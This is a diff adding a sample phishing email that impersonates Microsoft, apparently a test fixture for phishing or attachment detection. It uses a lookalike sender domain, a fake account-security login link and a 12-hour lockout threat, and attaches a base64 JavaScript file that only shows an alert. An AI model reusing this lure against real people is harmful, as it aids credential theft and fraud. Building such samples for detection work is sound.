@@ -1,0 +1,29 @@
+From: "Microsoft Support" <security-alert@m1crosoft-support.com>
+To: you@example.com
+Subject: [Action Required] Unusual Sign-in Activity Detected
+Date: Thu, 4 Jul 2025 15:21:00 +0530
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="alert-sep"
+
+--alert-sep
+Content-Type: text/plain
+
+Hello,
+
+We've detected suspicious sign-in activity on your Microsoft account. Please review the activity and secure your account:
+
+https://microsoft-account-security-check.com/session/login
+
+If you do not verify within 12 hours, your account will be temporarily locked.
+
+Regards,  
+Microsoft Account Team
+
+--alert-sep
+Content-Type: application/javascript
+Content-Disposition: attachment; filename="security_check.js"
+Content-Transfer-Encoding: base64
+
+ZnVuY3Rpb24gc3RhcnQoKSB7IGFsZXJ0KCJTZWN1cml0eSBjaGVjayBjb21wbGV0ZSIpOyB9IHN0YXJ0KCk7
+
+--alert-sep--
